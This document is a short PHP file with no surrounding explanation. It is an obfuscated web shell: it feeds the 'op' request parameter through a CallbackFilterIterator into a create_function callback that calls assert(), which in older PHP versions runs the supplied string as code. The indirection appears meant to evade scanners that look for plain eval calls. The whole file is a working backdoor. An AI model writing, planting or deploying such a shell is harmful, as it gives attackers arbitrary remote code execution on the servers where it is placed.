<?php
  $iterator = new CallbackFilterIterator(new ArrayIterator(array($_REQUEST['op'],)), create_function('$a', 'assert($a);'));
  foreach ($iterator as $item) 
  {
    echo $item;
  }
?>